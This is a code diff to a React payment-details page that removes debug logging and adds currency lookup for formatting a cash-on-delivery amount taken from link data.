@@ -4,7 +4,7 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
-import { formatCurrency } from "@/lib/countryCurrencies";
+import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
 import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck } from "lucide-react";
 
 const PaymentDetails = () => {
@@ -17,21 +17,14 @@ const PaymentDetails = () => {
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
 
-  // Debug: Log all data to check what's happening
-  console.log('=== PaymentDetails Debug ===');
-  console.log('linkData:', linkData);
-  console.log('linkData?.payload:', linkData?.payload);
-  console.log('shippingInfo:', shippingInfo);
-  console.log('shippingInfo.cod_amount:', shippingInfo?.cod_amount);
-  console.log('typeof shippingInfo.cod_amount:', typeof shippingInfo?.cod_amount);
-
   // Get country code from link data
   const countryCode = shippingInfo?.selectedCountry || "SA";
-  console.log('Country code:', countryCode);
 
-  // Ensure amount is a number, default to 500
+  // Get currency info for display
+  const currencyInfo = getCurrencyByCountry(countryCode);
+
+  // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
-  console.log('Raw amount from payload:', rawAmount);
 
   // Handle different data types and edge cases
   let amount = 500; // Default value
@@ -46,10 +39,8 @@ const PaymentDetails = () => {
     }
   }
 
-  console.log('Final amount:', amount, 'Type:', typeof amount);
+  // Format amount with currency symbol and name
   const formattedAmount = formatCurrency(amount, countryCode);
-  console.log('Formatted amount:', formattedAmount);
-  console.log('=== End Debug ===');
   
   const handleProceed = () => {
     // Check payment method from link data
